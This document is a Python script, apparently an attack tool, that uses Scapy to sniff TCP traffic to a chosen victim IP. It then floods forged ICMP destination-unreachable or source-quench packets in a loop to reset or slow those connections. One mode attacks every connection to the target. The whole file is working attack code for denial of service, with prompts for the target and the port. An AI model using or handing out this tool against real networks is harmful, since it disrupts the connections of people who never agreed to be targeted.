#!/usr/bin/env python3

from scapy.all import *
import socket   

class icmp_attacks:
	def blind_reset(pkt):
		print(pkt.load)
		print(pkt.summary)
		ip = IP();
		ip.src = pkt[IP].dst;
		ip.dst = pkt[IP].src;
		ip.sport = pkt[TCP].dport;
		ip.dport = pkt[TCP].sport;
		icmp = ICMP();
		icmp.type = 3;
		icmp.code = 2;
		ip2 = IP()
		ip2.src = pkt[IP].src;
		ip2.dst = pkt[IP].dst;
		ip2.sport = pkt[TCP].sport;
		ip2.dport = pkt[TCP].dport;
		print("Sending ICMP Reset, Ctrl-C to end")
		try:
			x= True
			while(x):
				send(ip/icmp/pkt[IP]/pkt[TCP], verbose=False);
		except KeyboardInterrupt:
			x = False
			print ("Ended reset attack")
		input("Press Enter to continue...")

	def execute(choice):
		
		dport = int(input("Please provide destination port for attack: "))
		victim_ip = input("Enter Target IP: ") 
		#gateway_ip = input("Enter Gateway IP: ")
		hostname = socket.gethostname()
		IPAddr = socket.gethostbyname(hostname)
		# get a tcp packet by sniffing network
		t = []
		while (len(t) == 0):
			print("Sniffing for source")
			if dport !=0 :
				t = sniff(iface='Ethernet0', count=1, lfilter=lambda x: x.haslayer(TCP) and x[IP].src == victim_ip and x[IP].dport == dport)
			else:
				#sniff and kill all
				print("Sniff and kill all")
				if choice == 1:
					sniff(iface='Ethernet0', lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == victim_ip, prn=icmp_attacks.blind_reset)
				else:
					sniff(iface='Ethernet0', lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == victim_ip, prn=icmp_attacks.source_quench)
		print("Packets found")
		t = t[0]
		if choice == 1:
			icmp_attacks.blind_reset(t)
		else:
			icmp_attacks.source_quench(t)


	def source_quench(pkt):
		ip = IP();
		ip.src = pkt[IP].dst;
		ip.dst = pkt[IP].src;
		ip.sport = pkt[TCP].dport;
		ip.dport = pkt[TCP].sport;
		icmp = ICMP();
		icmp.type = 4;
		icmp.code = 0;
		ip2 = IP()
		ip2.src = pkt[IP].src;
		ip2.dst = pkt[IP].dst;
		ip2.sport = pkt[TCP].sport;
		ip2.dport = pkt[TCP].dport;
		print("Sending ICMP Quench, Ctrl-C to end")
		try:
			x= True
			while(x):
				send(ip/icmp/pkt[IP]/pkt[TCP], verbose=False);
		except KeyboardInterrupt:
			x = False
			print ("Ended reset attack")
		input("Press Enter to continue...")
